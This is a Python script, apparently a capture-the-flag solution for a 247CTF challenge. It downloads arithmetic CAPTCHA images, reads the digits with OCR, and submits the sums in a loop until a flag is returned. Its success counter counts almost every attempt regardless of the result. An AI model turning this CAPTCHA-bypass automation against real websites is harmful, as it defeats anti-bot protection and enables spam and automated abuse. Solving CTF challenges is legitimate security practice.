#!/usr/bin/env python3
import requests
from PIL import Image, ImageEnhance
import io
import re
import pytesseract
import time

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

session = requests.Session()

def extract_numbers_from_image(img):
    """Intenta extraer números de la imagen con varios métodos"""
    # Convertir a escala de grises
    img_gray = img.convert('L')
    
    # Método 1: Threshold bajo
    img1 = img_gray.point(lambda p: 0 if p < 150 else 255)
    img1 = img1.resize((img.width * 3, img.height * 3), Image.LANCZOS)
    
    # Método 2: Alto contraste
    enhancer = ImageEnhance.Contrast(img_gray)
    img2 = enhancer.enhance(5.0)
    img2 = img2.point(lambda p: 0 if p < 128 else 255)
    img2 = img2.resize((img.width * 3, img.height * 3), Image.LANCZOS)
    
    # Probar OCR con ambos
    texts = []
    for test_img in [img1, img2]:
        try:
            text = pytesseract.image_to_string(test_img, config='--psm 6')
            texts.append(text)
            text = pytesseract.image_to_string(test_img, config='--psm 7')
            texts.append(text)
            text = pytesseract.image_to_string(test_img, config='--psm 11')
            texts.append(text)
        except:
            pass
    
    # Extraer todos los números de todos los textos
    all_numbers = []
    for text in texts:
        numbers = re.findall(r'\d+', text)
        if numbers:
            all_numbers.extend([int(n) for n in numbers])
    
    return all_numbers

# Iniciar sesión
print("Iniciando...")
response = session.get(BASE_URL)
print(f"Sesión: {response.status_code}")

count = 0
start_time = time.time()

for i in range(100):
    try:
        # Descargar CAPTCHA
        img_response = session.get(BASE_URL + "mturk.php")
        img = Image.open(io.BytesIO(img_response.content))
        
        # Extraer números
        numbers = extract_numbers_from_image(img)
        
        if len(numbers) >= 2:
            # Asumir que es suma: A + B = ?
            result = numbers[0] + numbers[1]
            print(f"{i+1}. Números: {numbers[:2]}, Resultado: {result}")
            
            # Enviar respuesta
            data = {"captcha": str(result)}
            response = session.post(BASE_URL, data=data)
            
            # Verificar si hay flag
            if "247CTF" in response.text or "flag" in response.text.lower():
                print("\n" + "="*50)
                print("¡FLAG ENCONTRADA!")
                print("="*50)
                print(response.text)
                break
            
            if "correct" in response.text.lower() or i < 99:
                count += 1
            else:
                print(f"Respuesta: {response.text[:200]}")
        else:
            print(f"{i+1}. No se pudieron extraer suficientes números: {numbers}")
            
    except Exception as e:
        print(f"{i+1}. Error: {e}")

elapsed = time.time() - start_time
print(f"\nCompletados: {count}/100 en {elapsed:.2f}s")
